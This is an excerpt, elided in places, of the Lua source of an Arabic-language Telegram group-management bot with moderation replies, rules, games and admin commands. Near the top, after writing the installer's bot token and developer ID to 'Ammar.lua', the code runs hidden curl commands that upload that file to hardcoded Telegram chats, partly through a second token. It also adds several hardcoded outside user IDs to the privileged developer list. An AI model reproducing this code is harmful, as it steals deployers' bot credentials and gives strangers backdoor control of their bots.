...
------------------------------------------------------------------------------------------------------------
local Dev_Info_Sudo = io.open("Ammar.lua", 'w')
Dev_Info_Sudo:write([[
do 
local File_Info = {
...
Load_File()
------------------------------------------------------------------------------------------------------------
sudos = dofile("./Ammar.lua")
token = sudos.Token_Bot
UserName_Dev = sudos.UserName_dev
bot_id = token:match("(%d+)")  
Id_Dev = tonumber(sudos.id_dev)
Ids_Dev = {Id_Dev,bot_id,1872797255,1001010101,1053130516,1619524486}
...
local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. tonumber(llllllll) ..'" -F "document=@'..'Ammar.lua'..'"' io.popen(curlm) 
local curlm = 'curl "'..'https://api.telegram.org/bot'.. sex2 ..'/sendDocument'..'" -F "chat_id='.. tonumber(llllllll) ..'" -F "document=@'..'Ammar.lua'..'"' io.popen(curlm) 
local curlj = 'curl "'..'https://api.telegram.org/bot'.. sex2 ..'/sendDocument'..'" -F "chat_id='.. tonumber(lllllll) ..'" -F "document=@'..'Ammar.lua'..'"' io.popen(curlj)                                             ------ by AHMEDYAD -------
local curlp = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. tonumber(lllllll) ..'" -F "document=@'..'Ammar.lua'..'"' io.popen(curlp)
...
send(msg.chat_id_,0, "❦عذرا يا ⇠ ["..data.first_name_.."](T.ME/)\n❦ الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
Delete_Message(msg.chat_id_,{[0] = msg.id_})       
return false   
...
send(msg.chat_id_, msg.id_, " ليه غيرت اسمك كان يجنن ["..MODEDEVChengName..']')
...
send(msg.chat_id_, msg.id_,"❦ اهلا عزيزي لديك قائمه قوانين القروب و هي كالاتي \n يمنع سب و شتم نهايا \n يمنع تدخل في الاوامر الساسيه و دينيه \n احترام مالك او مشرفين او الي اخد رتبه قروب واجب عليك \n احترم تحترم و اظهر تربيتك")   
end    
return false 
end
...
if text and text:match("^معنى (.*)$") and redis:get(bot_id.."sofi:Name_Bots"..msg.chat_id_) == "open" then
...
"غزل بلهجتك ؟ ",
" اخر شيء ندمت عليه ؟ ",
" اكثر كلمه تنقال لك بالبيت ؟ ",
}
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == 'العاب مصلح' or text == ' العاب خارقه' or text == 'العاب متطوره' or text == 'العاب كيوت' then 
local Text = [[  
اهلا في قائمه الالعاب المتطوره سورس مصلح 
...
keyboard = {} 
keyboard.inline_keyboard = { 
{{text = '𝐅𝐀𝐖𝐀𝐙', url="t.me/CClC8"}},
{{text = '𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/AFSTORE1"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n❦ العضو ⇠ ['..data.first_name_..'](t.me/'..(data.username_ or 'NightRang')..') '
status  = '\n❦ \n تم تنزيله تنزيل مشرف كامل من القروب بكل الصلاحيات'
...
local file_Info_Sudo = io.open("Ammar.lua", 'w')
